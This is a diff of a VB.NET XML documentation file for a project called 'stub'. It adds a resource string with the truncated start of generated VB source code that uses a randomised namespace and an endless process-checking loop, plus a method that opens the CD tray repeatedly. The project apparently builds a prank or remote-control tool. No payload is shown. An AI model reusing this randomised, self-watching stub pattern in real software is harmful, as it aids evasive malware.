@@ -22,15 +22,40 @@ stub
   resource lookups using this strongly typed resource class.
 </summary>
 </member>
-<member name="P:stub.My.Resources.Resources.donald">
+<member name="P:stub.My.Resources.Resources.lock_min">
 <summary>
   Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:stub.My.Resources.Resources.psource">
+<summary>
+  Looks up a localized string similar to         Imports System.Text
+        Imports System.Net
+        Imports System.Threading
+        Imports System.Net.NetworkInformation
+        Imports System.IO
+        Imports System.Windows.Forms
+        Imports System.Threading
+        Namespace &quot; &amp; randomnamespace &amp; &quot;
+	    Friend Partial Class Program
+		Public Shared Sub Main()
+ While True
+        Dim processexist As Boolean = False
+			For Each p As System.Diagnostics.Process In System.Diagnostics.Process.GetProcesses
+                Try
+   [rest of string was truncated]&quot;;.
 </summary>
 </member>
 <member name="T:stub.MainForm">
  <summary>
  TODO: Add mutex
  </summary>
+</member>
+<member name="M:stub.UIFeatures.LoopOpenCD(System.Int32)">
+ <summary>
+ Opens the CD (x amount of times) using the Media Control Interface
+ </summary>
+ <param name="amount"></param>
 </member>
 </members>
 </doc>
